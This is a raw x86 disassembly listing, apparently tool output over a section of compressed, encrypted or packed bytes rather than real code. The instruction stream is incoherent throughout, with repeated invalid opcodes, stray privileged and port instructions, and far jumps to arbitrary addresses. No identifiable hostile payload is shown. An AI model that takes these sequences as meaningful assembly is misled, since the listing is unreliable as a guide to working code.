  41c901:	and    esp,DWORD PTR [eax+0x62a9d4e7]
  41c907:	stos   BYTE PTR es:[edi],al
  41c908:	int    0xbe
  41c90a:	sar    al,0xb8
  41c90d:	fs loopne 0x41c938
  41c910:	or     bh,dl
  41c912:	mov    ch,BYTE PTR [esi+ebx*8+0x6bba7410]
  41c919:	jmp    0x41c8eb
  41c91b:	xchg   edi,eax
  41c91c:	jno    0x41c98e
  41c91e:	mov    edi,0x92f1b5c0
  41c923:	mov    ebx,0x2c7e2a36
  41c928:	sbb    al,0xa5
  41c92a:	test   eax,0x193c794a
  41c92f:	dec    edx
  41c930:	add    edi,DWORD PTR [eax+eiz*1]
  41c933:	xchg   ecx,eax
  41c934:	scas   al,BYTE PTR es:[edi]
  41c935:	out    dx,eax
  41c936:	mov    edi,0x57e44eca
  41c93b:	add    al,0xac
  41c93d:	fwait
  41c93e:	(bad)  
  41c93f:	xchg   ecx,eax
  41c940:	scas   al,BYTE PTR es:[edi]
  41c941:	pop    ecx
  41c942:	dec    ecx
  41c943:	shr    DWORD PTR [ecx-0x3cb84500],cl
  41c949:	or     bh,BYTE PTR [ebx-0x448330cb]
  41c94f:	cmp    dl,BYTE PTR [esi+0x53e44baf]
  41c955:	push   esp
  41c956:	push   0xe1f42bdd
  41c95b:	add    cl,BYTE PTR [ebx+0x8]
  41c95e:	not    BYTE PTR [ebx]
  41c960:	and    ah,dl
  41c962:	dec    edx
  41c963:	push   es
  41c964:	push   eax
  41c965:	and    dl,BYTE PTR [edi]
  41c967:	pop    es
  41c968:	xlat   BYTE PTR ds:[ebx]
  41c969:	sub    al,0x7
  41c96b:	jbe    0x41c912
  41c96d:	mov    dl,0xb2
  41c96f:	inc    ebx
  41c970:	cwde   
  41c971:	repz mov cx,0x55ec
  41c976:	push   eax
  41c977:	mov    bl,cl
  41c979:	retf   
  41c97a:	clc    
  41c97b:	cmp    BYTE PTR [ecx-0x6f5bce28],dl
  41c981:	mov    ebp,0xcc407804
  41c986:	push   edx
  41c987:	mov    al,ds:0xb4b20e0d
  41c98c:	mov    eax,0x184c58b9
  41c991:	or     DWORD PTR [ebp-0x39],esp
  41c994:	pushf  
  41c995:	les    ebp,FWORD PTR [ebp-0x1e3ccba]
  41c99b:	stos   BYTE PTR es:[edi],al
  41c99c:	push   ds
  41c99d:	aad    0x8a
  41c99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a0:	inc    esi
  41c9a1:	int    0x3d
  41c9a3:	inc    edi
  41c9a4:	call   0x5805:0x4326f0bd
  41c9ab:	push   ds
  41c9ac:	jmp    0x29b066e2
  41c9b1:	inc    edi
  41c9b2:	pop    ss
  41c9b3:	loope  0x41c935
  41c9b5:	or     al,0x27
  41c9b7:	and    BYTE PTR [eax-0x6b6368f7],0xbe
  41c9be:	fsubr  st,st(6)
  41c9c0:	(bad)  
  41c9c1:	inc    BYTE PTR [ecx+0x33d89667]
  41c9c7:	add    al,BYTE PTR [esi+0x2e]
  41c9ca:	addr16 inc ecx
  41c9cc:	xor    dl,ch
  41c9ce:	call   0x5a49:0x74f249e4
  41c9d5:	and    al,0xf0
  41c9d7:	and    ebp,DWORD PTR [edx-0x10]
  41c9da:	mov    WORD PTR [ebx+ecx*8-0x5c7ac8ed],gs
  41c9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9e3:	outs   dx,DWORD PTR ds:[esi]
  41c9e4:	xor    edi,DWORD PTR [esi+0x7228124d]
  41c9ea:	out    dx,al
  41c9eb:	aaa    
  41c9ec:	jecxz  0x41c9b5
  41c9ee:	or     ebp,DWORD PTR [ecx]
  41c9f0:	repz loope 0x41ca44
  41c9f3:	sbb    eax,0x8ab3f0e3
  41c9f8:	xor    eax,0xa12eebb4
  41c9fd:	jmp    0x41c987
  41c9ff:	retf   
  41ca00:	cld    
  41ca01:	inc    eax
  41ca02:	push   esp
  41ca03:	xor    al,0x97
  41ca05:	ja     0x41c9ec
  41ca07:	add    eax,0x9aae3817
  41ca0c:	sub    DWORD PTR [edx+0x6c036f8],esi
  41ca12:	pop    ebp
  41ca13:	hlt    
  41ca14:	pop    ds
  41ca15:	sbb    esp,DWORD PTR [ebx-0x16]
  41ca18:	mov    cl,0x77
  41ca1a:	(bad)  
  41ca1b:	popf   
  41ca1c:	sti    
  41ca1d:	cdq    
  41ca1e:	and    ebx,ebx
  41ca20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca21:	adc    dh,BYTE PTR [eax-0x4]
  41ca24:	push   0x281b5940
  41ca29:	shl    DWORD PTR [edx+0x23e63ffa],cl
  41ca2f:	aam    0x0
  41ca31:	and    al,BYTE PTR [edx]
  41ca33:	cwde   
  41ca34:	sbb    ch,ah
  41ca36:	retf   0x4fa5
  41ca39:	loopne 0x41ca45
  41ca3b:	clc    
  41ca3c:	sub    al,0xa6
  41ca3e:	mov    eax,0x9bd7a66a
  41ca43:	pop    edx
  41ca44:	das    
  41ca45:	jno    0x41ca2d
  41ca47:	mov    dh,0xf7
  41ca49:	adc    dl,bl
  41ca4b:	mov    ch,0x4e
  41ca4d:	sub    bl,0xba
  41ca50:	das    
  41ca51:	mov    bh,0x13
  41ca53:	iret   
  41ca54:	cmp    eax,0x35d610f8
  41ca59:	and    al,0xd3
  41ca5b:	je     0x41ca31
  41ca5d:	mov    BYTE PTR [esi],cl
  41ca5f:	mov    ecx,0x1da28e96
  41ca64:	test   BYTE PTR [esi],cl
  41ca66:	ja     0x41cac9
  41ca68:	mov    bh,0xe3
  41ca6a:	push   0x70
  41ca6c:	add    eax,0xffffff86
  41ca6f:	jns    0x41ca3b
  41ca71:	enter  0xcfcc,0xcc
  41ca75:	outs   dx,BYTE PTR ds:[esi]
  41ca76:	mov    bl,0xe6
  41ca78:	sar    bh,0xc
  41ca7b:	sub    esi,DWORD PTR [edx]
  41ca7d:	xchg   ebx,eax
  41ca7e:	sahf   
  41ca7f:	popf   
  41ca80:	inc    ebx
  41ca81:	mov    esi,esi
  41ca83:	call   0x6958:0x4240dfff
  41ca8a:	int    0xec
  41ca8c:	imul   eax,edx,0x7300b139
  41ca92:	mov    dl,0x45
  41ca94:	loope  0x41ca66
  41ca96:	inc    ecx
  41ca97:	les    ecx,FWORD PTR [eax+0x19]
  41ca9a:	mov    esp,DWORD PTR [ecx-0x1f071077]
  41caa0:	adc    al,BYTE PTR [esp+eiz*2]
  41caa3:	or     eax,DWORD PTR [eax+0x2c]
  41caa6:	adc    DWORD PTR [esi+edi*1+0xd],0xc6ae7718
  41caae:	and    al,0x8d
  41cab0:	adc    BYTE PTR [ebp-0x4f],dl
  41cab3:	inc    si
  41cab5:	repz mov ds:0x50d909e1,al
  41cabb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cabc:	(bad)  
  41cabd:	push   ebp
  41cabe:	sub    esp,DWORD PTR [eax-0x6bf2d30a]
  41cac4:	or     bh,al
  41cac6:	jge    0x41ca59
  41cac8:	xchg   BYTE PTR [edi-0x5823c663],al
  41cace:	sub    BYTE PTR cs:[edx],dh
  41cad1:	cli    
  41cad2:	mov    cl,0x7c
  41cad4:	mov    ch,0xd3
  41cad6:	mov    al,ds:0x48acdd9f
  41cadb:	mov    bh,0xe9
  41cadd:	enter  0xe520,0xd2
  41cae1:	pop    edi
  41cae2:	sahf   
  41cae3:	test   DWORD PTR [esp+ecx*8],ebp
  41cae6:	inc    ecx
  41cae7:	mov    WORD PTR [ebx+0x53032c30],ds
  41caed:	nop
  41caee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caef:	arpl   WORD PTR [edi-0x34268e19],bx
  41caf5:	repnz call 0xf646:0x36166620
  41cafd:	(bad)  
  41cafe:	sar    DWORD PTR [ecx+ecx*1+0x4b],cl
  41cb02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb03:	in     al,0x6d
  41cb05:	xor    eax,0x29d97344
  41cb0a:	or     dh,dl
  41cb0c:	out    dx,eax
  41cb0d:	mov    dh,0x63
  41cb0f:	mov    bl,0xdc
  41cb11:	fild   DWORD PTR cs:[ecx+0x68401816]
  41cb18:	jae    0x41cae7
  41cb1a:	ror    BYTE PTR [eax-0x7],1
  41cb1d:	pop    esp
  41cb1e:	imul   eax,DWORD PTR [esi+0x7d1dd28e],0x66dccf37
  41cb28:	mov    ?,WORD PTR [eax+0x52c6413e]
  41cb2e:	lods   al,BYTE PTR ds:[esi]
  41cb2f:	mov    ebp,0xe7511c10
  41cb34:	dec    esi
  41cb35:	pusha  
  41cb36:	mov    ds:0x889d7555,eax
  41cb3b:	cmp    al,0xd3
  41cb3d:	jbe    0x41cb63
  41cb3f:	ret    0x963f
  41cb42:	rcr    esi,0x43
  41cb45:	xchg   edx,eax
  41cb46:	xchg   ebp,eax
  41cb47:	pop    ds
  41cb48:	adc    ecx,DWORD PTR [esi]
  41cb4a:	nop
  41cb4b:	jo     0x41cad7
  41cb4d:	ror    BYTE PTR [ecx],cl
  41cb4f:	es dec ecx
  41cb51:	push   edx
  41cb52:	or     dh,cl
  41cb54:	fld    QWORD PTR [edx+0x365bd7f8]
  41cb5a:	lock clc 
  41cb5c:	nop
  41cb5d:	cmp    eax,DWORD PTR [ebx-0x1a17eed4]
  41cb63:	pop    edi
  41cb64:	jo     0x41cbb6
  41cb66:	xchg   DWORD PTR [ebx-0x50ed9963],edi
  41cb6c:	mov    ds:0x375a61cf,eax
  41cb71:	xchg   BYTE PTR [ebp+0x6d],dl
  41cb74:	xor    eax,0x379770f7
  41cb79:	and    dh,BYTE PTR [bx+si+0x26]
  41cb7d:	push   ds
  41cb7e:	mov    eax,ds:0xcac85433
  41cb83:	add    BYTE PTR [esi],cl
  41cb85:	xor    dh,BYTE PTR [ebp+0x3c]
  41cb88:	out    dx,al
  41cb89:	pop    ds
  41cb8a:	push   eax
  41cb8b:	in     al,dx
  41cb8c:	or     ch,BYTE PTR [esp+ebp*4-0x30]
  41cb90:	mov    es,WORD PTR [edx-0x1f7e43e6]
  41cb96:	popf   
  41cb97:	adc    ch,BYTE PTR [ecx+ebx*2-0x52f631c]
  41cb9e:	call   0x3544a5bb
  41cba3:	fs push 0xb8a9db00
  41cba9:	mov    ebx,0xb3a98db6
  41cbae:	adc    ebx,DWORD PTR [eax+0x3c]
  41cbb1:	sub    DWORD PTR [eax+ebp*4-0xc],ebp
  41cbb5:	out    dx,eax
  41cbb6:	xchg   ebx,eax
  41cbb7:	xor    esi,DWORD PTR [edx-0x3f]
  41cbba:	fs in  al,0x2c
  41cbbd:	stos   BYTE PTR es:[edi],al
  41cbbe:	ror    ch,1
  41cbc0:	test   eax,0x7881f0a
  41cbc5:	out    dx,al
  41cbc6:	jecxz  0x41cb6b
  41cbc8:	sbb    ch,BYTE PTR [esi]
  41cbca:	adc    eax,0x6105fbe3
  41cbcf:	xor    BYTE PTR [ecx-0x6cb8b740],ch
  41cbd5:	ret    
  41cbd6:	adc    ebp,0xb3f31267
  41cbdc:	lods   al,BYTE PTR ds:[esi]
  41cbdd:	xchg   ecx,eax
  41cbde:	psubsw mm1,QWORD PTR [ecx+0x52af2b4c]
  41cbe5:	and    bh,BYTE PTR [eax]
  41cbe7:	adc    edi,DWORD PTR [edx+0x51c8ff78]
  41cbed:	and    BYTE PTR ds:0xbdd7736e,ch
  41cbf3:	inc    ecx
  41cbf4:	add    al,0x21
  41cbf6:	ja     0x41cc55
  41cbf8:	sti    
  41cbf9:	cmp    ch,BYTE PTR [edi-0x215f193b]
  41cbff:	das    
  41cc00:	test   ebx,ecx
  41cc02:	ds test al,0x95
  41cc05:	xor    eax,0xa497944c
  41cc0a:	xchg   ebx,eax
  41cc0b:	add    ecx,DWORD PTR [esi+eiz*8-0x2e359374]
  41cc12:	imul   edx,DWORD PTR [esi+eax*8],0x84f69a30
  41cc19:	shr    BYTE PTR [ebx*1+0x460612b],1
  41cc20:	mov    dh,0x46
  41cc22:	push   ebx
  41cc23:	inc    edx
  41cc24:	outs   dx,DWORD PTR ds:[esi]
  41cc25:	xor    dl,ah
  41cc27:	sub    DWORD PTR [esi+edx*2+0x1570e77e],0xffffffbd
  41cc2f:	dec    esi
  41cc30:	jb     0x41cc1e
  41cc32:	sub    eax,0xfc143072
  41cc37:	jp     0x41cc04
  41cc39:	sbb    DWORD PTR [ebx+eax*2+0x4903a00c],ebp
  41cc40:	test   al,0xf0
  41cc42:	repnz nop
  41cc44:	clc    
  41cc45:	shl    dh,0x8e
  41cc48:	inc    esi
  41cc49:	sub    ebp,ecx
  41cc4b:	mul    DWORD PTR [bx+di-0x7f7]
  41cc50:	imul   edx,DWORD PTR ds:0xfaa1dc2a,0xe6e3f2a5
  41cc5a:	mov    eax,ds:0xe4345820
  41cc5f:	out    dx,eax
  41cc60:	xor    eax,edi
  41cc62:	leave  
  41cc63:	test   eax,0xb1cd2b37
  41cc68:	dec    ebp
  41cc69:	jge    0x41cc2d
  41cc6b:	mov    ecx,0x318db0ac
  41cc70:	ror    dl,cl
  41cc72:	in     al,dx
  41cc73:	(bad)
  41cc77:	jo     0x41ccc3
  41cc79:	int    0xcc
  41cc7b:	(bad)  
  41cc7c:	out    dx,al
  41cc7d:	repnz or DWORD PTR [eax-0x11],ebp
  41cc81:	faddp  st(0),st
  41cc83:	sahf   
  41cc84:	adc    eax,0x16032b23
  41cc89:	jle    0x41ccb0
  41cc8b:	stos   BYTE PTR es:[edi],al
  41cc8c:	in     al,dx
  41cc8d:	jae    0x41cca1
  41cc8f:	adc    eax,0x8eecdbff
  41cc94:	popa   
  41cc95:	adc    BYTE PTR [ebp+0x5d],al
  41cc98:	mov    esp,0xf7ede10d
  41cc9d:	dec    eax
  41cc9e:	vfmsub231ps ymm6,ymm0,ymm0
  41cca3:	in     al,dx
  41cca4:	repnz cmp al,0x4e
  41cca7:	(bad)  
  41cca8:	clc    
  41cca9:	dec    edi
  41ccaa:	push   esp
  41ccab:	loopne 0x41cc30
  41ccad:	fs xor eax,0x97d618a1
  41ccb3:	int3   
  41ccb4:	pop    edx
  41ccb5:	fadd   QWORD PTR [edx+0x2fecf72b]
  41ccbb:	lea    ebp,[eax]
  41ccbd:	into   
  41ccbe:	ins    DWORD PTR es:[edi],dx
  41ccbf:	lea    eax,[ebx-0x6d]
  41ccc2:	pop    ecx
  41ccc3:	cmp    bh,BYTE PTR ds:0x68501313
  41ccc9:	(bad)
  41cccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccce:	xchg   esp,eax
  41cccf:	aas    
  41ccd0:	sbb    bl,bh
  41ccd2:	sbb    BYTE PTR ds:0x6a8bc9a4,bl
  41ccd8:	repnz imul ebp,eax,0x65
  41ccdc:	cmp    eax,0x48c979f3
  41cce1:	call   0xa8d30941
  41cce6:	mov    edx,0x5e6e589b
  41cceb:	pop    eax
  41ccec:	jp     0x41cd10
  41ccee:	stc    
  41ccef:	xchg   esp,eax
  41ccf0:	mov    ebp,0x4384deba
  41ccf5:	mov    dh,dl
  41ccf7:	sub    edi,DWORD PTR [eax]
  41ccf9:	jne    0x41cc7e
  41ccfb:	out    dx,al
  41ccfc:	or     BYTE PTR [esi+ecx*4-0xd],dl
  41cd00:	daa    
  41cd01:	(bad)  [edx-0x41]
  41cd04:	shr    DWORD PTR [ebx-0x6144d276],cl
  41cd0a:	gs pop edi
  41cd0c:	div    DWORD PTR [esi-0x44]
  41cd0f:	xor    ebp,ebx
  41cd11:	jecxz  0x41cd0c
  41cd13:	jmp    0xb60c:0x7d93ff25
  41cd1a:	jne    0x41cd00
  41cd1c:	and    ah,BYTE PTR [ebp+0x668a9f4b]
  41cd22:	test   bl,dh
  41cd24:	sbb    eax,0xfd593f87
  41cd29:	pop    esi
  41cd2a:	pop    edx
  41cd2b:	jnp    0x41cd23
  41cd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd2e:	cmp    dl,BYTE PTR [ecx]
  41cd30:	imul   esp,ebx,0x502d6003
  41cd36:	pop    edi
  41cd37:	xchg   dl,dh
  41cd39:	pop    ebp
  41cd3a:	scas   al,BYTE PTR es:[edi]
  41cd3b:	or     bl,bh
  41cd3d:	call   0x4629f77
  41cd42:	push   ebp
  41cd43:	lock and BYTE PTR [eax],ch
  41cd46:	cmp    ch,BYTE PTR [ebx]
  41cd48:	cdq    
  41cd49:	test   al,0x10
  41cd4b:	iret   
  41cd4c:	data16 fstp QWORD PTR [ebx+0xd]
  41cd50:	mov    ebp,0x5d1de27b
  41cd55:	pop    ebx
  41cd56:	pop    ss
  41cd57:	jmp    0x4db4d728
  41cd5c:	adc    DWORD PTR ds:0xa2e1a3ef,esp
  41cd62:	lds    ecx,FWORD PTR [edx]
  41cd64:	cli    
  41cd65:	or     al,0xdf
  41cd67:	sbb    BYTE PTR [ecx],0x28
  41cd6a:	sahf   
  41cd6b:	pusha  
  41cd6c:	push   eax
  41cd6d:	mov    eax,DWORD PTR [edi+0x10]
  41cd70:	dec    ebp
  41cd71:	cmp    eax,0x7bde47bc
  41cd76:	xchg   esp,eax
  41cd77:	xchg   cl,dl
  41cd79:	out    0xc8,eax
  41cd7b:	les    ebx,FWORD PTR [ecx+0x7c35ba7]
  41cd81:	push   ecx
  41cd82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd83:	cwde   
  41cd84:	pop    esi
  41cd85:	test   eax,0x681ca957
  41cd8a:	xchg   dl,dl
  41cd8c:	int    0xaf
  41cd8e:	add    BYTE PTR [ebp-0x694ea99],bh
  41cd94:	retf   
  41cd95:	imul   ebx,DWORD PTR [ebx],0xffffffed
  41cd98:	in     al,dx
  41cd99:	rcl    BYTE PTR [eax+0x854298],0x32
  41cda0:	lea    ecx,[esp]
  41cda3:	fadd   QWORD PTR [ebp+0x5c]
  41cda6:	jo     0x41cdf8
  41cda8:	push   0xe47d049d
  41cdad:	pop    ebx
  41cdae:	and    bh,BYTE PTR [edi+0x2b]
  41cdb1:	sbb    ch,bh
  41cdb3:	outs   dx,DWORD PTR ds:[esi]
  41cdb4:	jmp    0x41cdf3
  41cdb6:	pusha  
  41cdb7:	repz sbb ebx,DWORD PTR [esi+eax*2-0x2228a0c6]
  41cdbf:	and    ebx,DWORD PTR [edx+0x17]
  41cdc2:	sub    DWORD PTR [ebx+0x75997fe5],edx
  41cdc8:	mov    esp,0x35f6fb85
  41cdcd:	xchg   dh,ch
  41cdcf:	xchg   DWORD PTR [ebx-0x79],ebx
  41cdd2:	int    0xf9
  41cdd4:	lds    esi,FWORD PTR [ebx]
  41cdd6:	rcl    BYTE PTR [ebx],1
  41cdd8:	or     ecx,esp
  41cdda:	cli    
  41cddb:	out    0xce,eax
  41cddd:	(bad)  
  41cdde:	xor    ecx,ebx
  41cde0:	ror    edi,0x1
  41cde3:	pop    edx
  41cde4:	and    BYTE PTR [edi+edi*1],dl
  41cde7:	inc    ebp
  41cde8:	fiadd  WORD PTR fs:[ecx]
  41cdeb:	adc    BYTE PTR [esi+0x7b],bl
  41cdee:	bound  edx,QWORD PTR [edi+ebp*1]
  41cdf1:	and    al,0xfa
  41cdf3:	push   edi
  41cdf4:	fwait
  41cdf5:	jae    0x41ce15
  41cdf7:	sbb    DWORD PTR [esi-0x69],ebp
  41cdfa:	repz push ss
  41cdfc:	lods   al,BYTE PTR ds:[esi]
  41cdfd:	test   ebx,edx
  41cdff:	mov    ds:0xe1e14421,al
  41ce04:	in     al,0x63
  41ce06:	dec    eax
  41ce07:	int3   
  41ce08:	mov    edi,0x10c710b2
  41ce0d:	mov    ecx,0x90ceb8f9
  41ce12:	sub    DWORD PTR [edi],esi
  41ce14:	pop    ebp
  41ce15:	or     DWORD PTR ds:0x68ef8afc,ebp
  41ce1b:	adc    al,0xa
  41ce1d:	sbb    eax,0x6798013
  41ce22:	inc    ebx
  41ce23:	pop    esi
  41ce24:	sub    al,al
  41ce26:	arpl   WORD PTR [edx-0x7678c1dc],di
  41ce2c:	sbb    ah,BYTE PTR [eax+0x47a6ccef]
  41ce32:	outs   dx,BYTE PTR ds:[esi]
  41ce33:	shr    BYTE PTR [ecx-0x5a],1
  41ce36:	cli    
  41ce37:	pop    es
  41ce38:	icebp  
  41ce39:	sub    eax,0xfd8b65c1
  41ce3e:	xor    ch,dl
  41ce40:	shl    DWORD PTR [eax-0x38],cl
  41ce43:	pop    esi
  41ce44:	cmp    esp,esi
  41ce46:	pop    esp
  41ce47:	dec    esp
  41ce48:	gs leave 
  41ce4a:	fwait
  41ce4b:	ins    BYTE PTR es:[edi],dx
  41ce4c:	imul   esp,DWORD PTR [edi+0x4f],0xffffff8d
  41ce50:	icebp  
  41ce51:	popf   
  41ce52:	cmp    ch,BYTE PTR [ebx-0xe]
  41ce55:	xor    eax,esi
  41ce57:	imul   edi,eax,0x2d62e66a
  41ce5d:	or     al,0x20
  41ce5f:	mov    eax,ds:0x14061a89
  41ce64:	dec    ebp
  41ce65:	pop    esp
  41ce66:	aad    0xb
  41ce68:	shl    DWORD PTR [ecx],0x38
  41ce6b:	xor    DWORD PTR [ecx-0x484c453e],esp
  41ce71:	lods   eax,DWORD PTR ds:[esi]
  41ce72:	mov    ah,0x34
  41ce74:	jbe    0x41cedf
  41ce76:	pop    es
  41ce77:	ret    
  41ce78:	xor    eax,0xd4ed17cc
  41ce7d:	ins    BYTE PTR es:[edi],dx
  41ce7e:	stos   BYTE PTR es:[edi],al
  41ce7f:	sbb    ecx,DWORD PTR [esi+0x4176055d]
  41ce85:	imul   esp,DWORD PTR [eax-0x54],0x3d648135
  41ce8c:	stos   BYTE PTR es:[edi],al
  41ce8d:	adc    DWORD PTR [eax],esp
  41ce8f:	sbb    esi,DWORD PTR [edi-0x6f]
  41ce92:	lods   eax,DWORD PTR ds:[esi]
  41ce93:	xchg   BYTE PTR [ebx-0x57],bh
  41ce96:	dec    BYTE PTR [ecx+eiz*1+0x4017ac03]
  41ce9d:	jg     0x41ce79
  41ce9f:	add    al,0x2a
  41cea1:	push   edi
  41cea2:	inc    ebp
  41cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea4:	pop    ebx
  41cea5:	arpl   si,ax
  41cea7:	or     eax,0xf602adc2
  41ceac:	mov    ebx,DWORD PTR [esi-0x45]
  41ceaf:	xor    eax,0x56671162
  41ceb4:	xchg   esp,eax
  41ceb5:	dec    ebx
  41ceb6:	outs   dx,DWORD PTR ds:[esi]
  41ceb7:	push   esp
  41ceb8:	adc    BYTE PTR [edi-0x13abbf8d],bh
  41cebe:	imul   DWORD PTR [ebp-0x3e91736c]
  41cec4:	outs   dx,DWORD PTR ds:[esi]
  41cec5:	and    bl,cl
  41cec7:	mov    esi,0xef0668f3
  41cecc:	stos   BYTE PTR es:[edi],al
  41cecd:	scas   al,BYTE PTR es:[edi]
  41cece:	(bad)  
  41cecf:	repz popf 
  41ced1:	push   0xa7fdf113
  41ced6:	imul   DWORD PTR [ecx-0x39]
  41ced9:	scas   al,BYTE PTR es:[edi]
  41ceda:	and    DWORD PTR [ebx],ebp
  41cedc:	(bad)  
  41cedd:	sti    
  41cede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cedf:	shl    DWORD PTR ds:0xdcccaea,cl
  41cee5:	mov    edi,0xcce84466
  41ceea:	and    ecx,DWORD PTR [ecx-0x6f]
  41ceed:	inc    ebx
  41ceee:	pop    es
  41ceef:	idiv   BYTE PTR [ecx]
  41cef1:	mov    WORD PTR ds:0x3a14b653,cs
  41cef7:	or     DWORD PTR [ecx+0x53d38993],edi
  41cefd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cefe:	mov    cr7,ebx
  41cf01:	xor    eax,0xa401a619
  41cf06:	inc    edx
  41cf07:	push   ebp
  41cf08:	fs xchg ecx,eax
  41cf0a:	push   ecx
  41cf0b:	call   0xa825:0xa5091062
  41cf12:	xchg   esi,eax
  41cf13:	mov    bl,0x4f
  41cf15:	std    
  41cf16:	adc    dl,BYTE PTR [edi]
  41cf18:	ret    
  41cf19:	push   cs
  41cf1a:	jnp    0x41cf98
  41cf1c:	mov    ebx,0x798a92f0
  41cf21:	cmp    BYTE PTR [ebx-0x6c],cl
  41cf24:	xor    ah,BYTE PTR [edi-0xa]
  41cf27:	sub    BYTE PTR [eax+0x6993f39e],0xdb
  41cf2e:	cmp    eax,0x9ed73074
  41cf33:	in     eax,0x78
  41cf35:	mov    edx,0xb7a0ab2b
  41cf3a:	or     BYTE PTR [esi],dh
  41cf3c:	gs dec ebp
  41cf3e:	repnz adc DWORD PTR [ebx+0xbbbb6fb],0x39b55ca8
  41cf49:	stc    
  41cf4a:	aaa    
  41cf4b:	loope  0x41cf60
  41cf4d:	or     edi,ecx
  41cf4f:	xor    edi,DWORD PTR [edx]
  41cf51:	fimul  WORD PTR [ebx]
  41cf53:	and    eax,0x6dabba0e
  41cf58:	or     eax,0x64a70fbc
  41cf5d:	int3   
  41cf5e:	and    ch,BYTE PTR [edi+ecx*1-0x392c515d]
  41cf65:	adc    BYTE PTR [ecx-0x3f90438c],0x91
  41cf6c:	mov    bl,0xd0
  41cf6e:	pop    eax
  41cf6f:	fistp  QWORD PTR [edx-0x58ba1b82]
  41cf75:	mov    ah,0x35
  41cf77:	or     ebp,DWORD PTR [edi+0x85ef9e8]
  41cf7d:	hlt    
  41cf7e:	call   0x4edf:0xd94fd19c
  41cf85:	pushf  
  41cf86:	fisttp DWORD PTR [eax-0x319099a4]
  41cf8c:	jno    0x41cf4d
  41cf8e:	mov    al,ds:0x6b4fce0c
  41cf93:	int3   
  41cf94:	popf   
  41cf95:	sbb    BYTE PTR [edi],dl
  41cf97:	dec    ebp
  41cf98:	xchg   BYTE PTR [esi-0x2f],dl
  41cf9b:	lods   al,BYTE PTR ds:[esi]
  41cf9c:	je     0x41cfa7
  41cf9e:	sbb    al,0x5d
  41cfa0:	dec    ebx
  41cfa1:	jp     0x41cfa7
  41cfa3:	add    dl,BYTE PTR [edx]
  41cfa5:	push   cs
  41cfa6:	adc    BYTE PTR [eax-0x7e],dh
  41cfa9:	cmp    al,0xf9
  41cfab:	sti    
  41cfac:	(bad)  
  41cfad:	scas   al,BYTE PTR es:[edi]
  41cfae:	adc    bl,BYTE PTR ds:0xb9b6e38a
  41cfb4:	fdivr  QWORD PTR [ebp+0x57e4cf63]
  41cfba:	lahf   
  41cfbb:	or     BYTE PTR [ebx+0x58485363],0x72
  41cfc2:	mov    esp,0x171c7dbe
  41cfc7:	(bad)  
  41cfc9:	cmp    BYTE PTR [edi-0x5987406d],cl
  41cfcf:	mov    esp,0xe955a588
  41cfd4:	cdq    
  41cfd5:	sbb    BYTE PTR fs:[ebp-0x41d8492c],0x9
  41cfdd:	and    edi,edi
  41cfdf:	mov    ds:0xb57f9a8d,al
  41cfe4:	sub    al,0xcf
  41cfe6:	jnp    0x41cf8a
  41cfe8:	(bad)  
  41cfe9:	cmp    al,0x93
  41cfeb:	cdq    
  41cfec:	lods   al,BYTE PTR ds:[esi]
  41cfed:	pop    ebp
  41cfee:	aad    0x6b
  41cff0:	mov    eax,ds:0xe8364b88
  41cff5:	fadd   st(5),st
  41cff7:	cmp    al,0xad
  41cff9:	mov    edx,0x6af65a7e
  41cffe:	sub    DWORD PTR [ebx],edi
  41d000:	rep ins BYTE PTR es:[edi],dx
  41d002:	xor    BYTE PTR [ebp+0x3cb3fffc],bh
  41d008:	test   BYTE PTR [ebp+0x1ae71224],dh
  41d00e:	mov    cl,0xe4
  41d010:	push   edx
  41d011:	pop    edx
  41d012:	stc    
  41d013:	mov    ah,0x3c
  41d015:	neg    DWORD PTR [ecx+0x2d]
  41d018:	fiadd  DWORD PTR [eax+ebx*8+0x4c]
  41d01c:	fisubr DWORD PTR [ebx+0x16]
  41d01f:	sub    dh,BYTE PTR [edx+0x12168a50]
  41d025:	sub    eax,0x9c59f847
  41d02a:	test   DWORD PTR [esi+0x27],esi
  41d02d:	pop    ebp
  41d02e:	mov    WORD PTR ds:0x6868b9e2,cs
  41d034:	push   cs
  41d035:	lds    esi,FWORD PTR [ebx+edi*2-0x52]
  41d039:	pop    ecx
  41d03a:	das    
  41d03b:	mov    cl,al
  41d03d:	push   0xffffffa8
  41d03f:	mov    ch,0xec
  41d041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d042:	scas   eax,DWORD PTR es:[edi]
  41d043:	out    0xa9,eax
  41d045:	ds push edi
  41d048:	mov    bh,0xe6
  41d04a:	fnstcw WORD PTR [esi-0x5861afad]
  41d050:	and    eax,0xbd037b7f
  41d055:	fwait
  41d056:	adc    ch,BYTE PTR [ebx+0x4f]
  41d059:	int3   
  41d05a:	jb     0x41d016
  41d05c:	sub    esp,DWORD PTR [edx]
  41d05e:	dec    edx
  41d05f:	sar    DWORD PTR [ecx+ebx*2+0x77],cl
  41d063:	adc    al,dh
  41d065:	sub    al,0x41
  41d067:	xchg   esi,eax
  41d068:	xor    BYTE PTR [ebx-0x188b5803],cl
  41d06e:	adc    DWORD PTR [eax],edx
  41d070:	mov    dh,0xdd
  41d072:	mov    BYTE PTR [ebp-0x9],dl
  41d075:	xchg   ebp,eax
  41d076:	pushf  
  41d077:	cmp    eax,0xd707280
  41d07c:	scas   eax,DWORD PTR es:[edi]
  41d07d:	and    esp,DWORD PTR [edx+0x65]
  41d080:	sbb    DWORD PTR [esi+ebp*2+0xe],edx
  41d084:	mov    ecx,0xb2627507
  41d089:	ins    DWORD PTR es:[edi],dx
  41d08a:	nop
  41d08b:	es jmp 0x41d069
  41d08e:	xchg   ecx,esi
  41d090:	mov    al,ds:0xcfd33af4
  41d095:	cmp    al,0x15
  41d097:	(bad)  
